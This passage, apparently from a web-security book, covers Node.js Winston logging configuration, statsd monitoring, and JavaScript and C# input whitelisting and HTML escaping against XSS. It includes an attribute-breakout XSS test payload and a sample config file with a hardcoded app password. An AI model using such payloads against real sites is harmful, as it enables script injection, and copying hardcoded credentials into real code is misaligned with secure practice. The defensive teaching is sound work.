          // Syslog compatible protocol severities.       
          levels: {
             debug: 0,
             info: 1,
             notice: 2,
             warning: 3,
             error: 4,
             crit: 5,
             alert: 6,   
             emerg: 7   
          },
          consoleTransportOptions: {
             level: 'debug',
             handleExceptions: true,
             json: false,
             colorize: true
          },
          fileTransportOptions: {
             level: 'debug',
             filename: './yourapp.log',         
             handleExceptions: true,
             json: true,
             maxsize: 5242880, //5MB
             maxFiles: 5,
             colorize: false
          },
          syslogPosixTransportOptions: {
             handleExceptions: true,
             level: 'debug',
             identity: 'yourapp_winston'
             //facility: 'local0' // default
                // /etc/rsyslog.conf also needs: local0.* /var/log/yourapp.log
                // If non posix syslog is used, then /etc/rsyslog.conf or one
                // of the files in /etc/rsyslog.d/ also needs the following
                // two settings:
                // $ModLoad imudp // Load the udp module.
                // $UDPServerRun 514 // Open the standard syslog port.
                // $UDPServerAddress 127.0.0.1 // Interface to bind to.
          },
          emailTransportOptions: {
             handleExceptions: true,
             level: 'crit',
             from: 'yourusername_alerts@fastmail.com',
             to: 'yourusername_alerts@fastmail.com',
             service: 'FastMail',
             auth: {
                user: "yourusername_alerts",
                pass: null // App specific password.
             },
             tags: ['yourapp']      
          }
       }   
    }

In development I have chosen here to not use syslog. You can see this on line 3 below. If you want to test syslog in development, you can either remove the logger object override from the `devbox1-development.js` file or modify it to be similar to the above. Then add one line to the `/etc/rsyslog.conf` file to turn on. As mentioned in a comment above in the `default.js` config file on line 44.

{title="devbox1-development.js", linenos=on, lang=JavaScript}
    module.exports = {
       logger: {
          syslogPosixTransportOptions: null
       }
    }

In production we log to syslog and because of that we do not need the file transport you can see configured starting on line 30 above in the `default.js` configuration file, so we set it to null as seen on line 6 below in the `prodbox-production.js` file.

I have gone into more depth about how we handle syslogs in the VPS chapter under the [Logging and Alerting](#vps-countermeasures-lack-of-visibility-logging-and-alerting) section, where all of our logs including these ones get streamed to an off-site syslog server. Thus providing easy aggregation of all system logs into one user interface that DevOpps can watch on their monitoring panels in real-time and also easily go back in time to visit past events. This provides excellent visibility as one layer of defence.

There were also some other [options](http://help.papertrailapp.com/kb/configuration/configuring-centralized-logging-from-nodejs-apps/) for those using Papertrail as their off-site syslog and aggregation PaaS, but the solutions were not as clean as simply logging to local syslog from your applications and then sending off-site from there. Again this is discussed in more depth in the "Logging and Alerting" section in the VPS chapter.

{title="prodbox-production.js", linenos=on, lang=JavaScript}
    module.exports = {
       logger: {
          consoleTransportOptions: {
             level: {},
          },
          fileTransportOptions: null,
          syslogPosixTransportOptions: {
             handleExceptions: true,
             level: 'info',
             identity: 'yourapp_winston'
          }
       }
    }

{title="local.js", linenos=off, lang=JavaScript}
    // Build creates this file.
    module.exports = {
       logger: {
          emailTransportOptions: {
             auth: {
                pass: 'Z-o?(7GnCQsnrx/!-G=LP]-ib' // App specific password.
             }
          }
       }
    }

The `logger.js` file wraps and hides extra features and transports applied to the logging package we are consuming.

{title="logger.js", linenos=off, lang=JavaScript}
    var winston = require('winston');
    var loggerConfig = require('config').logger;
    require('winston-syslog-posix').SyslogPosix;
    require('winston-email').Email;

    winston.emitErrs = true;

    var logger = new winston.Logger({
       // Alternatively: set to winston.config.syslog.levels
       exitOnError: false,
       // Alternatively use winston.addColors(customColours); There are many ways
       // to do the same thing with winston
       colors: loggerConfig.colours,
       levels: loggerConfig.levels
    });

    // Add transports. There are plenty of options provided and you can add your own.

    logger.addConsole = function(config) {
       logger.add (winston.transports.Console, config);
       return this;
    };

    logger.addFile = function(config) {
       logger.add (winston.transports.File, config);
       return this;
    };

    logger.addPosixSyslog = function(config) {
       logger.add (winston.transports.SyslogPosix, config);
       return this;
    };

    logger.addEmail = function(config) {
       logger.add (winston.transports.Email, config);
       return this;
    };

    logger.emailLoggerFailure = function (err /*level, msg, meta*/) {
       // If called with an error, then only the err param is supplied.
       // If not called with an error, level, msg and meta are supplied.
       if (err) logger.alert(
          JSON.stringify(
             'error-code:' + err.code + '. '
             + 'error-message:' + err.message + '. '
             + 'error-response:' + err.response + '. logger-level:'
             + err.transport.level + '. transport:' + err.transport.name
          )
       );
    };

    logger.init = function () {
       if (loggerConfig.fileTransportOptions)
          logger.addFile( loggerConfig.fileTransportOptions );
       if (loggerConfig.consoleTransportOptions)
          logger.addConsole( loggerConfig.consoleTransportOptions );
       if (loggerConfig.syslogPosixTransportOptions)
          logger.addPosixSyslog( loggerConfig.syslogPosixTransportOptions );
       if (loggerConfig.emailTransportOptions)
          logger.addEmail( loggerConfig.emailTransportOptions );
    };

    module.exports = logger;
    module.exports.stream = {
       write: function (message, encoding) {      
          logger.info(message);
       }
    };

When the app first starts it initialises the logger on line 15 below.

{title="app.js", linenos=on, lang=JavaScript}
    var http = require('http');
    var express = require('express');
    var path = require('path');
    var morganLogger = require('morgan');
    // Due to bug in node-config the next line is needed before config
    // is required: https://github.com/lorenwest/node-config/issues/202
    if (process.env.NODE_ENV === 'production')
       process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');
    // Yes the following are hoisted, but it's OK in this situation.
    var logger = require('./util/logger'); // Or use requireFrom module so no relative paths.
    //...
    var errorHandler = require('errorhandler');
    var app = express();
    //...
    logger.init();
    app.set('port', process.env.PORT || 3000);
    app.set('views', __dirname + '/views');
    app.set('view engine', 'jade');
    //...
    // In order to utilise connect/express logger module in our third party logger,
    // Pipe the messages through.
    app.use(morganLogger('combined', {stream: logger.stream}));
    app.use(methodOverride());
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(express.static(path.join(__dirname, 'public')));
    //...
    require('./routes')(app);

    if ('development' == app.get('env')) {
       app.use(errorHandler({ dumpExceptions: true, showStack: true }));
       //...
    }
    if ('production' == app.get('env')) {
       app.use(errorHandler());
       //...
    }

    http.createServer(app).listen(app.get('port'), function(){
       logger.info(
          "Express server listening on port " + app.get('port') + ' in '
          + process.env.NODE_ENV + ' mode'
       );
    });

* You can also optionally log JSON metadata
* You can provide an optional callback to do any work required, which will be called once all transports have logged the specified message.

Here are some examples of how you can use the logger. The `logger.log(level` can be replaced with `logger.<level>(` where level is any of the levels defined in the `default.js` configuration file above:

{title="Anywhere you need logging", linenos=off, lang=JavaScript}
    // With string interpolation also.
    logger.log('info', 'test message %s', 'my string');
    logger.log('info', 'test message %d', 123);
    logger.log('info', 'test message %j', {aPropertyName: 'Some message details'}, {});
    logger.log(
       'info', 'test message %s, %s', 'first', 'second',
       {aPropertyName: 'Some message details'}
    );
    logger.log(
       'info', 'test message', 'first', 'second', {aPropertyName: 'Some message details'}
    );
    logger.log(
       'info', 'test message %s, %s', 'first', 'second',
       {aPropertyName: 'Some message details'}, logger.emailLoggerFailure
    );
    logger.log(
       'info', 'test message', 'first', 'second',
       {aPropertyName: 'Some message details'}, logger.emailLoggerFailure
    );

Also consider hiding cross cutting concerns like logging using Aspect Oriented Programing (AOP)

#### Insufficient Monitoring
![](images/ThreatTags/PreventionEASY.png)

There are a couple of ways of approaching monitoring. You may want to see/be notified of the health of your application only when it is not fine (sometimes called the dark cockpit approach), or whether it is fine or not.

##### Dark Cockpit:

As discussed in the VPS chapter, Monit is an [excellent tool](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#monit) for the dark cockpit approach. It's easy to configure. Has excellent short [documentation](https://mmonit.com/monit/documentation/monit.html) that is easy to understand and the configuration file has lots of examples commented out ready for you to take as is and modify to suite your environment. I've personally had excellent [success](http://blog.binarymist.net/2015/06/27/keeping-your-nodejs-web-app-running-on-production-linux/#getting-started-with-monit) with Monit.

##### Statistics Graphing:

Continuing on with the [Statistics Graphing](#vps-countermeasures-lack-of-visibility-monitoring-statistics-graphing) section in the VPS chapter, we look at adding [statsd](https://github.com/etsy/statsd/) as application instrumentation to our existing collectd -> graphite set-up.

{linenos=off}
      Server1   
       +--------------+
       | statsd client|--+
    +-<| collectd     |  |
    |  +--------------+  |
    |                    v    Graphing
    v   Server2          |    Server
    |  +--------------+  |   +-----------+
    |  | statsd client|--+-->| statsd    |
    +-<| collectd     |  |   |   |       |
    |  +--------------+  |   |   v       |
    |                    ^   | graphite  |<-+
    v   Server3, etc     |   +-----------+  |
    |  +--------------+  |                  |
    |  | statsd client|--+                  ^
    +-<| collectd     |                     |
    |  +--------------+                     |
    +-------------------->------------------+


Just as collectd can send data to graphite to provide continual system visibility ,statsd can do the same for our applications. 

statsd is a lightweight NodeJS daemon that collects statistics by listening for UDP packets containing them and aggregates. The protocol that statsd expects to receive looks like the following:

{title="statsd receiving protocol", linenos=off}
    <metric name>:<value>|<type>

Where `<type>` is one of the following:

{title="Counting", linenos=off}
    c

{title="Timing", linenos=off}
    ms

{title="Gauges", linenos=off}
    g

{title="Sets", linenos=off}
    s

So for example if you have statsd running locally with the default server and port, you can test with the following command:

{title="statsd receiving protocol", linenos=off}
    echo "foo:1|c" | nc -u -w0 127.0.0.1 8125

The server and port are specified in the config file that you create for yourself. You can create this from the [`exampleConfig.js`](https://github.com/etsy/statsd/blob/master/exampleConfig.js) as a starting point. In `exampleConfig.js` you will see the server and port properties. The current options for server are tcp or udp, with udp being the default. The server file must exist in the [`./servers/`](https://github.com/etsy/statsd/tree/master/servers) directory.

One of the ways we can generate statistics for our statsd daemon is by using one of the many language specific [statsd clients](https://github.com/etsy/statsd/wiki#client-implementations).

{linenos=off}
    +----------------------+
    | your application     |--> statsd -> graphite
    | with a statsd client |
    +----------------------+

_Todo_

Detail how we collect application statistics and send to graphite. Show real life example.

%% The first and best set of resources are the four posts detailed at the bottom of this one: https://www.digitalocean.com/community/tutorials/an-introduction-to-tracking-statistics-with-graphite-statsd-and-collectd

%% Looks like the first statsd spec for metric types: https://github.com/b/statsd_spec/blob/master/README.md
%% Looks like the up to date, or at least more recent statsd spec for metric types: https://github.com/etsy/statsd/blob/master/docs/metric_types.md

%% Configuring Graphite for statsd: https://github.com/etsy/statsd/blob/master/docs/graphite.md

%% https://www.datadoghq.com/blog/statsd/

### Lack of Input Validation, Filtering and Sanitisation {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation}
![](images/ThreatTags/PreventionAVERAGE.png)

#### Generic {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic}

Your staple practises when it comes to defending against potentially dangerous input are validation and filtering. There are cases though when the business requires that input must be accepted that is dangerous yet still valid. This is where you will need to implement sanitisation. There is a lot more research and thought involved when you need to perform sanitisation, so the first cause of action should be to confirm that the specific dangerous yet valid input is in-fact essential.

**Recommendations:**

Research:

* Libraries
* The execution contexts that your data will flow through / be placed in
* Which character signatures need to be sanitised

Attempt to use well tested, battle hardened language specific libraries that know how to validate, filter and sanitise.

Create enough [evil test conditions](#process-and-practises-agile-development-and-practices-evil-test-conditions) to verify that:

* Only white listed characters can be received (both client and server side)
* Your filtering routines are doing as expected with valid and non valid input (both client and server side)
* All valid characters that need some modification are modified. Modifying could simply be a case of for example rounding a float down (removing precision), or changing the case of an alpha character. Not usually a security issue.
* Sanitising or transforming the character signatures known to be dangerous in the execution contexts you have discovered you have in your code that these character signatures pass through / are placed in; are transformed into their safe counterparts. If your libraries cover all cases, which from my experience I have not seen yet, that is great, but often there will be edge cases that stop the libraries being useful in every case. I provide an example of this below where the available libraries did not cover the edge cases I had in a project I worked on a few years ago. When this happens you may need to create some sanitisation logic. At this point, you are really going to have to gain good understanding of the execution contexts that will affect you and the different types of escaping you need to know about.
* Maximum and minimum field lengths are enforced

##### Types of Escaping: {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-types-of-escaping}

Escaping is a technique used to sanitise. Escaped data will still render in the browser properly. Escaping simply lets the interpreter know that the data is not intended to be executed and thus prevents the attack.

There are a number of types of escaping you need to know about depending on where you may be intending on inserting untrusted data. Work through the following set of rules in order:

1. HTML Escape
2. Attribute Escape
3. JavaScript Escape
  1. HTML Escape JSON values in HTML context
4. CSS Escape
5. URL Escape
6. Sanitise HTML
7. Prevent DOM-based XSS

All of the above points are covered in depth in the OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules). **Familiarise yourself with the rules before completing any custom sanitisation work**.

##### Example in JavaScript and C\# {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp}

A>
A> When out of the box libraries do not cover all of your sanitisation needs.
A>

The following example was taken from a project I worked on a few years ago.

Client side validation, filtering and sanitisation is more about UX (User Experience) helping the honest user by saving round trip communications to the server than stopping an attacker, as an attacker will simply by-pass any client side defences.

We needed to apply a white list to all characters being entered into the `value` attribute of `input` elements of `type="text"` and also `textarea` elements. The requirement was that the end user could not insert invalid characters into one of these fields and by insert we mean:

1. type the characters in
2. [ctrl]+[v] a clipboard full of characters in
3. right click -> Paste

The following was the strategy that evolved. Performance was measured and even with an interval much lower than the 300 milliseconds, the performance impact was negligible. As soon as any non white list character(s) was entered, it was immediately deleted within 300 milliseconds.

`$` references jQuery.

{title="Validation using white list", linenos=off, lang=JavaScript}
    var userInputValidationIntervalId = 0;

    setupUserInputValidation = function () {

       var textAreaMaxLength = 400;
       var elementsToValidate;
       var whiteList = /[^A-Za-z_0-9\s.,]/g;

       var elementValue = {
          textarea: '',
          textareaChanged: function (obj) {
             var initialValue = obj.value;
             var replacedValue = initialValue.
                replace(whiteList, "").
                slice(0, textAreaMaxLength);
             if (replacedValue !== initialValue) {
                this.textarea = replacedValue;
                return true;
             }
             return false;
          },
          inputtext: '',
          inputtextChanged: function (obj) {
             var initialValue = obj.value;
             var replacedValue = initialValue.replace(whiteList, "");
             if (replacedValue !== initialValue) {
                this.inputtext = replacedValue;
                return true;
             }
             return false;
          }
       };

       elementsToValidate = {
          textareainputelements: (function () {
             var elements = $('#page' + currentPage).find('textarea');
             if (elements.length > 0) {
                return elements;
             }
             return 'no elements found';
          } ()),
          textInputElements: (function () {
             var elements = $('#page' + currentPage).find('input[type=text]');
             if (elements.length > 0) {
                return elements;
             }
             return 'no elements found';
          } ())
       };

       // store the intervals id in outer scope
       // so we can clear the interval when we change pages.
       userInputValidationIntervalId = setInterval(function () {
          var element;

          // Iterate through each one and remove any characters not in the whitelist.
          // Iterate through each one and trim any that are longer than 400.

          for (element in elementsToValidate) {
             if (elementsToValidate.hasOwnProperty(element)) {
                elementsToValidate
                if (elementsToValidate[element] === 'no elements found')
                   continue;

                $.each(elementsToValidate[element], function () {
                   $(this).attr('value', function () {
                      var name = $(this).prop('tagName').toLowerCase();
                      name = name === 'input' ? name + $(this).prop('type') : name;
                      if (elementValue[name + 'Changed'](this))
                         this.value = elementValue[name];
                   });
                });
             }
          }
       }, 300); // Milliseconds.
    };

Each time we changed the page, we cleared the interval and reset it for the new page.

{title="", linenos=off, lang=JavaScript}
    clearInterval(userInputValidationIntervalId);
    setupUserInputValidation();

HTML5 provides the `pattern` attribute on the `input` tag, which allows us to specify a regular expression that the text received is checked against. Although this does not apply to `textarea`s. Also when validation occurs is not specified in the [HTML specification](https://html.spec.whatwg.org/multipage/forms.html#the-pattern-attribute), so this may not provide enough control.

Now what we do here is extend the `String` prototype with a function called `htmlEscape`.


{title="Sanitisation using escaping", linenos=off, lang=JavaScript}
    if (typeof Function.prototype.method !== "function") {
       Function.prototype.method = function (name, func) {
          this.prototype[name] = func;
          return this;
       };
    }
    
    String.method('htmlEscape', function () {
    
       // Escape the following characters with HTML entity encoding
       // to prevent switching into any execution context,
       // such as script, style, or event handlers.
       // Using hex entities is recommended in the spec.
       // In addition to the 5 characters significant in XML (&, <, >, ", '),
       // the forward slash is included as it helps to end an HTML entity.
       var character = {
          '&': '&amp;',
          '<': '&lt;',
          '>': '&gt;',
          '"': '&quot;',
          // Double escape character entity references. Why?
          // The XmlTextReader that is setup in XmlDocument.LoadXml on the service considers
          // the character entity references (&#xxxx;) to be the character they represent.
          // All XML is converted to unicode on reading and any such entities are
          // removed in favour of the unicode character they represent.
          // So we double escape character entity references.
          // These now get read to the XmlDocument and saved to the database as
          // double encoded Html entities.
          // Now when these values are pulled from the database and sent to the browser,
          // it decodes the & and displays #x27; and/or #x2F.
          // This isn't what we want to see in the browser, so on the way out,
          // we use the below SingleDecodeDoubleEncodedHtml extension method.
          "'": '&amp;#x27;',    // &apos; is not recommended
          '/': '&amp;#x2F;'     // forward slash is included as it helps end an HTML entity
       };
    
       return function () {
          return this.replace(/[&<>"'/]/g, function (c) {
             return character[c];
          });
       };
    }());

Just before any user input was sent back to the server, we would check each of the fields that we were receiving input from by doing the following:

{title="", linenos=on, lang=JavaScript}
    element.value.htmlEscape();

"_HTML entity encoding is okay for untrusted data that you put in the body of the HTML document, such as inside a `<div>` tag. It even sort of works for untrusted data that goes into attributes, particularly if you're religious about using quotes around your attributes._"

> OWASP XSS Prevention Cheat Sheet

For us, this would be enough, as we would be `HTML` escaping our `textarea` elements and we were happy to make sure we were religious about using quotes around the `value` attribute on `input` of `type="text"`.

"_But HTML entity encoding doesn't work if you're putting untrusted data inside a `<script>` tag anywhere, or an event handler attribute like `onmouseover`, or inside CSS, or in a URL. So even if you use an HTML entity encoding method everywhere, you are still most likely vulnerable to XSS. You MUST use the escape syntax for the part of the HTML document you're putting untrusted data into._" 

> OWASP XSS Prevention Cheat Sheet

The escaping rules discussed [above](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-types-of-escaping) detail this. Check out the [OWASP resource](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#Why_Can.27t_I_Just_HTML_Entity_Encode_Untrusted_Data.3F) for full details.

Rule #2 of the OWASP XSS Prevention Cheat Sheet discusses attribute escaping. Now because we were only using `value` attributes and we had the luxury of being able to control the fact that we would always be using properly quoted attributes, we didn't have to take this extra step of escaping all (other than alphanumeric) ASCII characters that is values less than 256 with the `&#xHH` format to prevent switching out of the attribute context.

Because I wanted to be sure about not being able to escape out of the attributes context if it was properly quoted I tested it. I created a collection of injection attacks, none of which worked. If you enter something like the following into the attribute `value` of an `input` element where `type="text"`, then the first double quote will be interpreted as the corresponding quote and the end double quote will be interpreted as the end quote of the `onmouseover` attribute value.

{title="", linenos=off, lang=JavaScript}
    " onmouseover="alert(2)

All the legitimate double quotes are interpreted as the double quote `HTML` entity `"` and all illegitimate double quotes are interpreted as the character value. This is what you end up with:

{title="", linenos=off, lang=JavaScript}
    value=" &quot; onmouseover=&quot;alert(2)"

Now in regards to the code comments in the block of code above titled "Sanitisation using escaping", I mentioned having to double escape character references. We were using `XSL` for the `HTML` because we needed to perform transformations before delivering to the browser. Because we were sending the strings to the browser, it was easiest to single decode the double encoded `HTML` on the service side only. Now because we were still focused on the client side sanitisation and we would soon be shifting our focus to making sure we cover the server side, we knew we were going to have to create some sanitisation routines for our .NET service. Because the routines are quite likely going to be static and we were pretty much just dealing with strings, we created an extensions class in a new project in a common library we already had. This would provide the widest use from our sanitisation routines. It also allowed us to wrap any existing libraries or parts of them that we wanted to get use of.

{title="Common.Security.Encoding.Extensions.SingleDecodeDoubleEncodedHtml", linenos=off, lang=C#}
    namespace Common.Security.Encoding {
       /// <summary>
       /// Provides a series of extension methods that perform sanitisation.
       /// Escaping, unescaping, etc.
       /// Usually targeted at user input, to help defend against the likes of XSS attacks.
       /// </summary>
       public static class Extensions {
          /// <summary>
          /// Returns a new string in which all occurrences of a double escaped html character
          /// (that's an html entity immediatly prefixed with another html entity)
          /// in the current instance are replaced with the single escaped character.
          /// </summary>
          /// <param name="source"></param>
          /// <returns>The new string.</returns>
          public static string SingleDecodeDoubleEncodedHtml(this string source) {
             return source.Replace("&amp;#x", "&#x");
          }
       }
    }

Now when we ran our `xslt` transformation on the service, we chain our new extension method on the end. Which gives us back a single encoded string that the browser is happy to display as the decoded value.

{title="", linenos=on, lang=C#}
    return Transform().SingleDecodeDoubleEncodedHtml();

Now turning our attention to the server side... Untrusted data (data entered by a user), should always be treated as though it may contain attack code.
This data should not be sent anywhere without taking the necessary steps to detect and neutralise the malicious code depending on which execution contexts it will pass through.

With applications becoming more interconnected, attacks being buried in user input and decoded and/or executed by a downstream interpreter is common. Input validation, that is restricting user input to allow only certain white listed characters and restricting field lengths are only two forms of defence. Any decent attacker can get around client side validation, so you need to employ defence in depth. If you need to validate, filter and sanitise, at the very least, it needs to be done on the server side.

I found `System.Net.WebUtility` from the `System.Web.dll` assembly to do most of what we needed other than provide us with fine grained information of what had been tampered with. So I took it and extended it slightly. We had not employed AOP at this stage, so there was some copy past modifying.

First up, the exceptions we used:

{title="Common.WcfHelpers.ErrorHandling.Exceptions.WcfException", linenos=off, lang=C#}
    namespace Common.WcfHelpers.ErrorHandling.Exceptions {
       public abstract class WcfException : Exception {
          /// <summary>
          /// In order to set the message for the client, set it here,
          /// or via the property directly in order to over ride default value.
          /// </summary>
          /// <param name="message">
          /// The message to be assigned to the Exception's Message.
          /// </param>
          /// <param name="innerException">
          /// The exception to be assigned to the Exception's InnerException.
          /// </param>
          /// <param name="messageForClient">
          /// The client friendly message. This parameter is optional, but should be set.
          /// </param>
          public WcfException(
             string message, Exception innerException = null, string messageForClient = null
          ) : base(message, innerException) {
             MessageForClient = messageForClient;
          }

          /// <summary>
          /// This is the message that the services client will see.
          /// Make sure it is set in the constructor. Or here.
          /// </summary>
          public string MessageForClient {
             get {
                return string.IsNullOrEmpty(_messageForClient) ?
                   "The MessageForClient property of WcfException was not set" :
                   _messageForClient;
             }
             set { _messageForClient = value; }
          }
          private string _messageForClient;
       }
    }

And the more specific `SanitisationWcfException`:

{title="Common.WcfHelpers.ErrorHandling.Exceptions.SanitisationWcfException", linenos=off, lang=C#}
    using System;
    using System.Configuration;
    
    namespace Common.WcfHelpers.ErrorHandling.Exceptions {
       /// <summary>
       /// Exception class that is used when the user input sanitisation fails,
       /// and the user needs to be informed.
       /// </summary>
       public class SanitisationWcfException : WcfException {
          private const string _defaultMessageForClient =
             "Answers were NOT saved. User input validation was unsuccessful.";
          public string UnsanitisedAnswer { get; private set; }
 
          /// <summary>
          /// In order to set the message for the client, set it here,
          /// or via the property directly in order to over ride default value.
          /// </summary>
          /// <param name="message">
          /// The message to be assigned to the Exception's Message.
          /// </param>
          /// <param name="innerException">
          /// The Exception to be assigned to the base class instance's inner exception.
          /// This parameter is optional.
          /// </param>
          /// <param name="messageForClient">
          /// The client friendly message. This parameter is optional, but should be set.
          /// </param>
          /// <param name="unsanitisedAnswer">
          /// The user input string before service side sanitisatioin is performed.
          /// </param>
          public SanitisationWcfException (
             string message,
             Exception innerException = null,
             string messageForClient = _defaultMessageForClient,
             string unsanitisedAnswer = null
          ) : base (
             message,
             innerException,
             messageForClient +
             " If this continues to happen, please contact " +
             ConfigurationManager.AppSettings["SupportEmail"] + Environment.NewLine
          ) {
             UnsanitisedAnswer = unsanitisedAnswer;
          }
       }
    }

Now we defined whether our requirements were satisfied by way of executable requirements (unit tests(in their rawest form)):

{title="Common.Security.Encoding.UnitTest.ExtensionsTest", linenos=off, lang=C#}
    using NUnit.Framework;
    using Common.Security.Sanitisation;
    
    namespace Common.Security.Encoding.UnitTest {
       [TestFixture]
       public class ExtensionsTest {
    
          private readonly string _inNeedOfEscaping =
             @"One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.";
          private readonly string _noNeedForEscaping =
             @"One x2F two amp three x27 four lt five quot six gt       .";
          
          [Test]
          public void SingleDecodeDoubleEncodedHtml_ShouldSingleDecodeDoubleEncodedHtml() {
             string doubleEncodedHtml = @" &amp;#x27; some text &amp;#x2F; ";
             string singleEncodedHtmlShouldLookLike = @" &#x27; some text &#x2F; ";
             string singleEncodedHtml = doubleEncodedHtml.SingleDecodeDoubleEncodedHtml();
             Assert.That(singleEncodedHtml, Is.EqualTo(singleEncodedHtmlShouldLookLike));
          }
 
          [Test]
          public void Extensions_CompliesWithWhitelist_ShouldNotComply() {
             Assert.That(
                _inNeedOfEscaping.CompliesWithWhitelist(whiteList: @"^[\w\s\.,]+$"),
                Is.False
             );
          }
 
          [Test]
          public void Extensions_CompliesWithWhitelist_ShouldComply() {
             Assert.That(
                _noNeedForEscaping.CompliesWithWhitelist(whiteList: @"^[\w\s\.,]+$"),
                Is.True
             );
             Assert.That(
                _inNeedOfEscaping.CompliesWithWhitelist(whiteList: @"^[\w\s\.,#/&'<"">]+$"),
                Is.True
             );
          }
       }
    }

Now the code that satisfies the above executable specifications, and more:

{title="Common.Security.Sanitisation.Extensions", linenos=on, lang=C#}
    using System;
    using System.Collections.Generic;
    using System.Globalization;
    using System.IO;
    using System.Text.RegularExpressions;
    
    namespace Common.Security.Sanitisation {
       /// <summary>
       /// Provides a series of extension methods that perform sanitisation.
       /// Escaping, unescaping, etc.
       /// Usually targeted at user input,
       /// to help defend against the likes of XSS and other injection attacks.
       /// </summary>
       public static class Extensions {
       
          private const int CharacterIndexNotFound = -1;
       
          /// <summary>
          /// Returns a new string in which all occurrences of a double escaped html character
          /// (that's an html entity immediatly prefixed with another html entity)
          /// in the current instance are replaced with the single escaped character.
          /// </summary>
          /// <param name="source">
          /// The target text used to strip one layer of Html entity encoding.
          /// </param>
          /// <returns>The singly escaped text.</returns>
          public static string SingleDecodeDoubleEncodedHtml(this string source) {
             return source.Replace("&amp;#x", "&#x");
          }

          /// <summary>
          /// Filter a text against a regular expression whitelist of specified characters.
          /// </summary>
          /// <param name="target">The text that is filtered using the whitelist.</param>
          /// <param name="alternativeTarget"></param>
          /// <param name="whiteList">
          /// Needs to be be assigned a valid whitelist, otherwise nothing gets through.
          /// </param>
          public static bool CompliesWithWhitelist(
             this string target, string alternativeTarget = "", string whiteList = ""
          ) {
             if (string.IsNullOrEmpty(target))
                target = alternativeTarget;
     
             return Regex.IsMatch(target, whiteList);
          }

          // Warning!
          // The following code is not pretty, it came from System.Net.WebUtility.

          /// <summary>
          /// Takes a string and returns another with a single layer of
          /// Html entity encoding replaced with it's Html entity literals.
          /// </summary>
          /// <param name="encodedUserInput">
          /// The text to perform the opperation on.
          /// </param>
          /// <param name="numberOfEscapes">
          /// The number of Html entity encodings that were replaced.
          /// </param>
          /// <returns>
          /// The text that's had a single layer of Html entity encoding
          /// replaced with it's Html entity literals.
          /// </returns>
          public static string HtmlDecode(
             this string encodedUserInput, ref int numberOfEscapes
          ) {
             const int NotFound = -1;
          
             if (string.IsNullOrEmpty(encodedUserInput))
                return string.Empty;
       
             StringWriter output = new StringWriter(CultureInfo.InvariantCulture);
          
             if (encodedUserInput.IndexOf('&') == NotFound) {
                output.Write(encodedUserInput);
             } else {
                int length = encodedUserInput.Length;
                for (int index1 = 0; index1 < length; ++index1) {
                   char ch1 = encodedUserInput[index1];
                   if (ch1 == 38) {
                      int index2 = encodedUserInput.IndexOfAny(
                         _htmlEntityEndingChars, index1 + 1
                      );
                      if (index2 > 0 && encodedUserInput[index2] == 59) {
                         string entity = encodedUserInput.Substring(
                            index1 + 1, index2 - index1 - 1
                         );
                         if (entity.Length > 1 && entity[0] == 35) {
                            ushort result;
                            if (entity[1] == 120 || entity[1] == 88)
                               ushort.TryParse(
                                  entity.Substring(2),
                                  NumberStyles.AllowHexSpecifier,
                                  NumberFormatInfo.InvariantInfo,
                                  out result
                               );
                            else
                               ushort.TryParse(
                                  entity.Substring(1),
                                  NumberStyles.AllowLeadingWhite |
                                  NumberStyles.AllowTrailingWhite |
                                  NumberStyles.AllowLeadingSign,
                                  NumberFormatInfo.InvariantInfo,
                                  out result
                               );
                            if (result != 0) {
                               ch1 = (char)result;
                               numberOfEscapes++;
                               index1 = index2;
                            }
                         } else {
                            index1 = index2;
                            char ch2 = HtmlEntities.Lookup(entity);
                            if ((int)ch2 != 0) {
                               ch1 = ch2;
                               numberOfEscapes++;
                            } else {
                               output.Write('&');
                               output.Write(entity);
                               output.Write(';');
                               continue;
                            }
                         }
                      }
                   }
                   output.Write(ch1);
                }
             }
             string decodedHtml = output.ToString();
             output.Dispose();
             return decodedHtml;
          }

          /// <summary>
          /// Escapes all character entity references (double escaping where necessary).
          /// Why? The XmlTextReader that is setup in XmlDocument.LoadXml on the service
          /// considers the character entity references (&#xxxx;)
          /// to be the character they represent.
          /// All XML is converted to unicode on reading and any such entities are removed
          /// in favor of the unicode character they represent.
          /// </summary>
          /// <param name="unencodedUserInput">The string that needs to be escaped.</param>
          /// <param name="numberOfEscapes">The number of escapes applied.</param>
          /// <returns>The escaped text.</returns>
          public static unsafe string HtmlEncode(
             this string unencodedUserInput,
             ref int numberOfEscapes
          ) {
             if (string.IsNullOrEmpty(unencodedUserInput))
                return string.Empty;
           
             StringWriter output = new StringWriter(CultureInfo.InvariantCulture);
              
             if (output == null)
                throw new ArgumentNullException("output");
             int num1 = IndexOfHtmlEncodingChars(unencodedUserInput);
             if (num1 == -1) {
                output.Write(unencodedUserInput);
             } else {
                int num2 = unencodedUserInput.Length - num1;
                fixed (char* chPtr1 = unencodedUserInput) {
                   char* chPtr2 = chPtr1;
                   while (num1-- > 0)
                      output.Write(*chPtr2++);
                   while (num2-- > 0) {
                      char ch = *chPtr2++;
                      if (ch <= 62) {
                         switch (ch) {
                            case '"':
                               output.Write("&quot;");
                               numberOfEscapes++;
                               continue;
                            case '&':
                               output.Write("&amp;");
                               numberOfEscapes++;
                               continue;
                            case '\'':
                               output.Write("&amp;#x27;");
                               numberOfEscapes = numberOfEscapes + 2;
                               continue;
                            case '<':
                               output.Write("&lt;");
                               numberOfEscapes++;
                               continue;
                            case '>':
                               output.Write("&gt;");
                               numberOfEscapes++;
                               continue;
                            case '/':
                               output.Write("&amp;#x2F;");
                               numberOfEscapes = numberOfEscapes + 2;
                               continue;
                            default:
                               output.Write(ch);
                               continue;
                         }
                      }
                      if (ch >= 160 && ch < 256) {
                         output.Write("&#");
